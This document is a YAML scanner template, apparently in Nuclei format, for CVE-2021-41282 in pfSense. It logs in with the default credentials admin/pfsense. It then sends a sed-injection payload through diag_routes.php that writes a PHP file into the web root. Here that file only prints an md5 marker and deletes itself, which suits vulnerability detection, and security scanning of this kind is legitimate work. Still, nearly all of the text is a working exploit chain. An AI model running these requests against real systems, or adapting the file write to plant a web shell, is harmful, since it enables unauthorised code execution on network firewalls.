id: yaml-poc-pfsense-pfsense-other-CVE-2021-41282
info:
  name: Yaml Poc Pfsense Pfsense Other Cve 2021 41282
  author: converted
  severity: high
  description: 'Converted from xpoc: yaml-poc-pfsense-pfsense-other-CVE-2021-41282'
  tags: cve
  classification:
    cve-id: CVE-2021-41282
  reference:
  - http://packetstormsecurity.com/files/166208/pfSense-2.5.2-Shell-Upload.html
  - https://cxsecurity.com/cveshow/CVE-2021-41282/
  - https://cxsecurity.com/issue/WLB-2022030023
  - https://docs.netgate.com/pfsense/en/latest/releases/22-01_2-6-0.html
  - https://packetstormsecurity.com/files/166208/pfSense-2.5.2-Shell-Upload.html
http:
- method: GET
  path:
  - /index.php
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: POST
  path:
  - /index.php
  body: __csrf_magic={{var_csrfToken}}&usernamefld=admin&passwordfld=pfsense&login=Sign+In
  headers:
    Content-Type: application/x-www-form-urlencoded
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 302
- method: GET
  path:
  - /diag_routes.php?isAjax=1&filter=.*/!d;};s/Destination/\x3c\x3fphp+var_dump(md5({{r1}}));unlink(__FILE__)\x3b\x3f\x3e/;w+/usr/local/www/{{rFilename}}.php%0a%23
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
